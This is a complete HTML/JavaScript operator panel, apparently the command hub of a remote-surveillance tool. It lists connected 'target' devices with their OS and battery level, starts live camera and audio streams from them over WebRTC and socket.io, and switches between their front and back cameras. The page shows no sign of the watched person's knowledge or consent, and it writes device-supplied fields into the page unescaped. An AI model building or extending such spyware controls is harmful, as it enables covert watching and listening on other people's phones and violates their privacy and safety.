
<!DOCTYPE html>
<html>
<head>
    <title>LEO ADMIN - COMMAND HUB</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; }
        .sidebar { width: 280px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; }
        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
        .user-item { background: #112240; padding: 15px; margin: 10px 0; border-radius: 10px; cursor: pointer; border: 1px solid transparent; }
        .user-item.active { border-color: var(--blue); box-shadow: 0 0 10px var(--blue); }
        .video-box { width: 100%; max-width: 800px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 15px; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: contain; }
        .controls { margin-top: 20px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; }
        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 12px; border-radius: 5px; cursor: pointer; font-weight: bold; }
        .btn:hover { background: var(--blue); color: var(--dark); }
        #login { position: fixed; inset: 0; background: var(--dark); display: flex; align-items: center; justify-content: center; z-index: 100; }
        .info-tag { font-size: 0.7rem; color: #8892b0; margin-top: 5px; }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="login">
        <div style="text-align: center;">
            <h2 style="color: var(--blue);">SYSTEM ACCESS</h2>
            <input type="password" id="pin" placeholder="PIN" style="padding:10px; border-radius:5px; background:#111; color:white; border:1px solid var(--blue);">
            <button onclick="auth()" class="btn" style="margin-top:10px; width:100%;">LOGIN</button>
        </div>
    </div>
    <div class="sidebar">
        <h3 style="color: var(--blue);">ACTIVE DEVICES</h3>
        <div id="user-list"></div>
    </div>
    <div class="main">
        <div id="status-line" style="margin-bottom:15px; font-size:0.8rem; width:100%; display:flex; justify-content:space-between;">
            <div>STATUS: <span id="conn-status" style="color:#00ff00;">HUB ONLINE</span></div>
            <div>DEVICE: <span id="cur-id" style="color:var(--blue);">NONE</span></div>
        </div>
        <div class="video-box">
            <video id="remoteVideo" autoplay playsinline></video>
            <div id="audio-btn" style="position:absolute; bottom:10px; right:10px; background:red; padding:8px; border-radius:5px; cursor:pointer;" onclick="unmute()">ðŸ”Š UNMUTE</div>
        </div>
        <div class="controls">
            <button class="btn" onclick="sendCommand('front')">FRONT CAMERA</button>
            <button class="btn" onclick="sendCommand('back')">BACK CAMERA</button>
            <button class="btn" onclick="refreshHub()">REFRESH STREAM</button>
            <button class="btn" style="color:#ff4444; border-color:#ff4444;" onclick="location.reload()">FULL RESET</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentTarget = null, pc;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        function auth() { socket.emit('admin-join', document.getElementById('pin').value); }
        socket.on('admin-status', (r) => { if(r.success) document.getElementById('login').classList.add('hidden'); else alert("ACCESS DENIED"); });
        socket.on('update-targets', (l) => {
            const list = document.getElementById('user-list');
            list.innerHTML = "";
            l.forEach(target => {
                const d = document.createElement('div');
                d.className = `user-item ${currentTarget === target.id ? 'active' : ''}`;
                d.innerHTML = `<strong>Device_${target.id.substring(0,4)}</strong>
                               <div class="info-tag">OS: ${target.device} | Battery: ${target.battery}</div>`;
                d.onclick = () => select(target.id);
                list.appendChild(d);
            });
        });

        function unmute() { const v = document.getElementById('remoteVideo'); v.muted = false; v.play(); document.getElementById('audio-btn').classList.add('hidden'); }
        function refreshHub() { if(currentTarget) select(currentTarget); }

        async function select(id) {
            currentTarget = id; document.getElementById('cur-id').innerText = id.substring(0,8);
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: currentTarget, signal: { candidate: e.candidate } }); };
            pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            socket.emit('command', { targetId: currentTarget, cmd: 'start' });
        }

        socket.on('signal', async (d) => {
            if(d.from !== currentTarget) return;
            if(d.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
                if(d.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                }
            } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
        });

        function sendCommand(c) { socket.emit('command', { targetId: currentTarget, cmd: c }); }
    </script>
</body>
</html>
